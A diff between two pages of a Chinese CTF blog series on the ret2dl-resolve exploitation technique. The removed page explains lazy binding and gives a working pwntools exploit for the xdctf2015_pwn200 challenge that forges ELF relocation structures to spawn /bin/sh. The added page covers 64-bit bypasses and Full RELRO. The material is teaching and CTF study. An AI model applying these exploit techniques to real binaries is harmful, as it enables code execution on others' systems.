@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ret2dl-resolve(1)：原理及基础利用, 翰青HanQi&#39;s Blog">
-    <meta name="description" content="ret2dl_resolve的原理解读及32位基础利用方式">
+    <meta name="keywords" content="ret2dl-resolve(2)：64位利用及Full RELRO, 翰青HanQi&#39;s Blog">
+    <meta name="description" content="ret2dl_resolve的64位利用及Full RELRO解决">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ret2dl-resolve(1)：原理及基础利用 | 翰青HanQi&#39;s Blog</title>
+    <title>ret2dl-resolve(2)：64位利用及Full RELRO | 翰青HanQi&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -335,12 +335,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ret2dl-resolve(1)：原理及基础利用</h1>
+                    <h1 class="description center-align post-title">ret2dl-resolve(2)：64位利用及Full RELRO</h1>
                 </div>
             </div>
         </div>
@@ -389,7 +389,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-11-14
+                    2022-11-18
                 </div>
                 
 
@@ -398,7 +398,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.1k
                 </div>
                 
 
@@ -428,79 +428,47 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p>
-<ol>
-<li>通过信息泄露获得程序的内存布局</li>
-<li>实际的漏洞利用</li>
+                <h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol>
+<li>相关结构体大小不同</li>
+<li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li>
+<li>在这里直接引用<a target="_blank" rel="noopener" href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li>
 </ol>
-<p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p>
-<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a target="_blank" rel="noopener" href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p>
-<h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol>
-<li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li>
-<li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li>
-<li>Full RELRO: 详见(2)部分内容</li>
-</ol>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p>
-<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 启动程序</span>
-<span class="token comment"># io = remote('node4.buuoj.cn',26320)</span>
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span>
-<span class="token comment"># io = gdb.debug('./bof')</span>
-e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span>
-<span class="token comment"># libc = ELF('./')</span>
-
-<span class="token comment"># 源程序gadget</span>
-write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>
-vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>
-bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
-pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>
-leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>
-pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span>
-
-<span class="token comment"># 程序中section地址</span>
-plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
-rel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
-dynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
-dynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
-
-<span class="token comment"># 伪造相应结构</span>
-stack_size <span class="token operator">=</span> <span class="token number">0x800</span>
-base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size
-fake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>
-align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>
-fake_dynsym_addr <span class="token operator">+=</span> align
-fake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>
-st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstr
-st_value <span class="token operator">=</span> <span class="token number">0</span>
-st_size <span class="token operator">=</span> <span class="token number">0</span>
-st_info <span class="token operator">=</span> <span class="token number">0x12</span>
-<span class="token comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>
-fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>
-fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>
-reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_plt
-r_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>
-r_type <span class="token operator">=</span> <span class="token number">0x7</span>
-r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>
-r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
-fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
-fake_dynstr <span class="token operator">=</span> <span class="token string">b'system\x00'</span>
-
-<span class="token comment"># stack pivot</span>
-io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>
-pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token comment"># ret2dl_resolve</span>
-binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>
-payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
-payload <span class="token operator">+=</span> <span class="token string">b'/bin/sh\x00'</span>
-payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">b'a'</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>
+<ul>
+<li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。<pre class="line-numbers language-c" data-language="c"><code class="language-c">     <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-&gt;</span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>
+    <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
+  version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-&gt;</span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-&gt;</span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p>
+<h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-&gt;</span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">else</span>
+  <span class="token punctuation">{</span>
+    <span class="token comment">/* We already found the symbol.  The module (and therefore its load
+address) is also known.  */</span>
+    value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_addr <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> l<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">lookup_t</span> result<span class="token punctuation">;</span>    <span class="token comment">//查找函数的结果，其为定义函数的共享对象的加载基地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p>
+<ul>
+<li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li>
+<li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li>
+<li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li>
+<li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li>
+<li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li>
+</ul>
+<h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a target="_blank" rel="noopener" href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>
 
                 
             </div>
@@ -527,7 +495,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jamorant12138.github.io/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/">https://jamorant12138.github.io/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</a>
+                    <a href="https://jamorant12138.github.io/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/">https://jamorant12138.github.io/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -883,31 +851,31 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/">
+                <a href="/2022/11/22/free-hook-jie-chi-glibc2.26-zhi-qian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="ret2dl-resolve(2)：64位利用及Full RELRO">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="free_hook劫持(glibc2.26之前)">
                         
-                        <span class="card-title">ret2dl-resolve(2)：64位利用及Full RELRO</span>
+                        <span class="card-title">free_hook劫持(glibc2.26之前)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ret2dl_resolve的64位利用及Full RELRO解决
+                            libc2.26之前版本的__free_hook劫持方法探究
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-18
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-11-22
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Stack-Overflow/" class="post-category">
-                                    Stack Overflow
+                            <a href="/categories/%E6%8E%A2%E7%A9%B6/" class="post-category">
+                                    探究
                                 </a>
                             
                             
@@ -932,31 +900,31 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/11/10/tcache-ji-zhi-rao-guo/">
+                <a href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Tcache机制绕过">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="ret2dl-resolve(1)：原理及基础利用">
                         
-                        <span class="card-title">Tcache机制绕过</span>
+                        <span class="card-title">ret2dl-resolve(1)：原理及基础利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            libc2.26-2.27版本Tcache机制的绕过方法探究
+                            ret2dl_resolve的原理解读及32位基础利用方式
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%8E%A2%E7%A9%B6/" class="post-category">
-                                    探究
+                            <a href="/categories/Stack-Overflow/" class="post-category">
+                                    Stack Overflow
                                 </a>
                             
                             
